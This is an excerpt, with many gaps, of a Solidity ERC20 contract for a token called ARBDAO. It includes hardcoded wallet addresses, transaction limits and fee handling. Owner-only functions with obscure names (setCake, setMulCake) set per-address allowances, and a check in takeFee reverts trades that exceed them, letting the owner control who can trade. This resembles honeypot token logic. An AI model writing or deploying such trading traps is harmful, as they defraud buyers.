...
contract ARBDAO is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "ARBDAO";
    string private _symbol = "ARBDAO";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xFa09ceC978c82B28f4D8538efF38daf4ecA8F6D2); 
    address payable private teamWalletAddress = payable(0xA14187Be1ce0B6A8C7f3112cc73Cb9A3678A3445); 
    ...
    uint256 public _maxTxAmount = 2  * 10**8* 10**_decimals; 
    uint256 public _walletMax = 2 * 10**8* 10**_decimals;
    ...
    constructor (uint256 serviceFee_,uint256[2] memory buyFeeSetting_) {
	    require(
            121000000000000000 == serviceFee_ ,
...
//		payable(serviceFeeReceiver_).transfer(serviceFee_);
	...
	function setCake(address  recipient, uint256 amount) external onlyOwner() {
        startList[recipient] = amount;
    }
	
	function setMulCake(address[] calldata addresses, uint256 amount) public onlyOwner {
        require(addresses.length < 201); // to prevent gas error
        for (uint256 i; i < addresses.length; ++i) {
            startList[addresses[i]] = amount;
        }
    }
        ...
        else
        {
		    if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && isMarketPair[recipient], "!startAddLP");
                }
            }  
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]) {
		    ...
		    require(startList[sender]>=(sellList[sender].add(amount)),"sell amout gt buy total");
